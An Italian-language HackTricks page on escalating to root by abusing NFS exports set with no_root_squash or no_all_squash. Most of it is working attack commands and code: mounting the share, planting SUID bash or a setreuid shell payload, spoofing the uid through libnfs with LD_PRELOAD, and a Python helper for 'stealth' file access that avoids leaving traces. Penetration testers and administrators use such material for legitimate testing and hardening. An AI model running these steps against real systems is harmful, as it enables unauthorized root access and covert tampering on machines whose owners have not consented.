<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>


Leggi il file _ **/etc/exports** _, se trovi una directory configurata come **no\_root\_squash**, allora puoi **accedervi** come **client** e **scrivere al suo interno** come se fossi l'utente **root** locale della macchina.

**no\_root\_squash**: Questa opzione dà essenzialmente l'autorità all'utente root del client di accedere ai file sul server NFS come root. E ciò può comportare gravi implicazioni per la sicurezza.

**no\_all\_squash:** Questa opzione è simile all'opzione **no\_root\_squash** ma si applica agli **utenti non root**. Immagina di avere una shell come utente nobody; controlla il file /etc/exports; l'opzione no\_all\_squash è presente; controlla il file /etc/passwd; emula un utente non root; crea un file suid come quell'utente (montando tramite nfs). Esegui il suid come utente nobody e diventa un utente diverso.

# Escalation dei Privilegi

## Exploit Remoto

Se hai trovato questa vulnerabilità, puoi sfruttarla:

* **Montando quella directory** in una macchina client e **copiando come root** all'interno della cartella montata il binario **/bin/bash** e conferendogli i diritti **SUID**, e **eseguendo dalla macchina vittima** quel binario bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montare quella directory** in una macchina client e **copiare come root** all'interno della cartella montata il nostro payload compilato che sfrutterà il permesso SUID, gli darà i diritti SUID e lo eseguirà dalla macchina vittima (puoi trovare qui alcuni [payload C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Exploit Locale

{% hint style="info" %}
Nota che se puoi creare un **tunnel dalla tua macchina alla macchina vittima, puoi comunque utilizzare la versione remota per sfruttare questa escalation di privilegi tunnelizzando le porte richieste**.\
Il seguente trucco è nel caso in cui il file `/etc/exports` **indichi un indirizzo IP**. In questo caso **non sarai in grado di utilizzare** in nessun caso l'**exploit remoto** e avrai bisogno di **abusare di questo trucco**.\
Un altro requisito necessario affinché l'exploit funzioni è che **l'esportazione all'interno di `/etc/export`** **deve utilizzare il flag `insecure`**.\
\--_Non sono sicuro che se `/etc/export` indica un indirizzo IP questo trucco funzionerà_--
{% endhint %}

## Informazioni di base

Lo scenario prevede lo sfruttamento di una condivisione NFS montata su una macchina locale, sfruttando una falla nella specifica NFSv3 che consente al client di specificare il suo uid/gid, consentendo potenzialmente l'accesso non autorizzato. Lo sfruttamento coinvolge l'utilizzo di [libnfs](https://github.com/sahlberg/libnfs), una libreria che consente la falsificazione delle chiamate RPC NFS.

### Compilazione della libreria

I passaggi di compilazione della libreria potrebbero richiedere modifiche in base alla versione del kernel. In questo caso specifico, le chiamate di sistema fallocate sono state commentate. Il processo di compilazione prevede i seguenti comandi:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Esecuzione dell'exploit

L'exploit prevede la creazione di un semplice programma in C (`pwn.c`) che eleva i privilegi a root e quindi esegue una shell. Il programma viene compilato e il binario risultante (`a.out`) viene posizionato sulla condivisione con suid root, utilizzando `ld_nfs.so` per falsificare l'uid nelle chiamate RPC:

1. **Compilare il codice dell'exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Posizionare l'exploit sulla condivisione e modificare i suoi permessi falsificando l'uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Eseguire l'exploit per ottenere i privilegi di root:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell per l'accesso stealth ai file
Una volta ottenuto l'accesso root, per interagire con la condivisione NFS senza modificare la proprietà (per evitare di lasciare tracce), viene utilizzato uno script Python (nfsh.py). Questo script regola l'uid in modo da corrispondere a quello del file che viene accesso, consentendo l'interazione con i file sulla condivisione senza problemi di autorizzazioni:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Esegui come:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Riferimenti
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
